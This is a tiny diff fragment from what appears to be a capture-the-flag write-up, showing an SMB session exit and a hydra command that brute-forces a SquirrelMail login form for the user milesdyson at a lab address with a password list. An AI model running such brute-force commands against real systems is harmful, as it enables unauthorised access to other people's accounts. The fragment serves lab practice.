@@ -126,5 +126,4 @@ smb: \logs\> q
 
 ```
 hydra -l milesdyson -P /home/w3awer/skynet/pass.txt 10.129.145.218 http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^:F=Unknown user or password incorrect."
-
 ```
